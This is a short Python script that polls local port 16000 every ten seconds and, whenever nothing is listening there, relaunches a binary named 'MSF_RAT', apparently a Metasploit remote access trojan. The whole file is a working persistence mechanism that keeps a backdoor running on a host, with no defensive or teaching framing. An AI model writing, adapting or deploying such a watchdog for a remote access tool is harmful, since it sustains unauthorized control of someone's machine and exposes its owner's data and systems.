#!/usr/bin/python

import psutil
import subprocess
import time

def check_port(port):
    for conn in psutil.net_connections():
        if conn.laddr.port == port and conn.status == 'LISTEN':
            return True
    return False

def start_application():
    subprocess.Popen(['/home/user16/MSF_RAT'])

port_to_check = 16000
while True:
    time.sleep(10)
    if not check_port(port_to_check):
        start_application()

